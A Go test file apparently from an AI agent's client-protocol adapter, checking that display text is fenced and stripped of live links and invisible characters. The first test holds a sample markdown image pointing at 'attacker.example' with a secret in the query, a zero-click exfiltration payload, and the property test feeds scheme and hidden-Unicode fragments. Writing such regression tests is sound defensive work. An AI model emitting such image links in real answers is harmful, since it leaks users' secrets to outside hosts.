package acpagent

import (
	"regexp"
	"strings"
	"testing"
	"unicode/utf8"

	"pgregory.net/rapid"

	"github.com/kirahowe/agentloop"
)

// Regression (cross-cutting review): a display's title and body went to
// any ACP client as plain markdown, so a client that knows nothing of
// displays fetched a remote image in a reader's answer before anyone
// approved anything.
func TestADisplaysTextBlockIsInert(t *testing.T) {
	d := agentloop.Display{Title: "Receipt", Body: "![receipt](https://attacker.example/pixel?secret=abc)​ hi ``` x",
		Labels: []string{"contaminated", "private"}}
	c := DisplayContent(d)
	text := c.Content.Content.Text.Text
	if strings.Contains(text, "https://") || strings.Contains(text, "attacker.example") || strings.Contains(text, "​") {
		t.Fatalf("live text %q", text)
	}
	if !strings.HasPrefix(text, "````text\n") || !strings.HasSuffix(text, "\n````") {
		t.Fatalf("not fenced past the backticks in it: %q", text)
	}
	if !strings.Contains(string(c.Content.Content.Text.Meta[DisplayMeta]), "https://attacker.example/pixel") {
		t.Fatal("the display under _meta changed")
	}
}

var live = regexp.MustCompile(`(?i)\b[a-z][a-z0-9+.\-]*://`)

// Whatever the text, the block is one fence that nothing inside can
// close, holds no character that draws as nothing, and no live link.
func TestPropertyInertText(t *testing.T) {
	rapid.Check(t, func(rt *rapid.T) {
		parts := rapid.SliceOf(rapid.SampledFrom([]string{"a", " ", "\n", "`", "```", "````", ".", "https://", "HTTP://",
			"javascript://", "evil", "example.com", "​", "‮", "\U000E0041", "️", "![x](", ")", "。", "ㅤ"})).Draw(rt, "parts")
		s := strings.Join(parts, "")
		out := Inert(s)
		if !utf8.ValidString(out) {
			rt.Fatal("invalid UTF-8")
		}
		lines := strings.Split(out, "\n")
		fence := strings.TrimSuffix(lines[0], "text")
		if strings.Trim(fence, "`") != "" || len(fence) < 3 || lines[len(lines)-1] != fence {
			rt.Fatalf("fence %q in %q", fence, out)
		}
		for _, l := range lines[1 : len(lines)-1] {
			if strings.HasPrefix(strings.TrimLeft(l, " "), fence) {
				rt.Fatalf("a line closes the fence: %q", out)
			}
		}
		for _, r := range out {
			if hidden(r) {
				rt.Fatalf("hidden %U in %q", r, out)
			}
		}
		for _, m := range live.FindAllString(out, -1) {
			switch strings.ToLower(m) {
			case "hxxp://", "hxxps://", "fxp://":
			default:
				rt.Fatalf("live scheme %q in %q", m, out)
			}
		}
		if strings.Contains(out, "example.com") {
			rt.Fatalf("a live domain in %q", out)
		}
	})
}
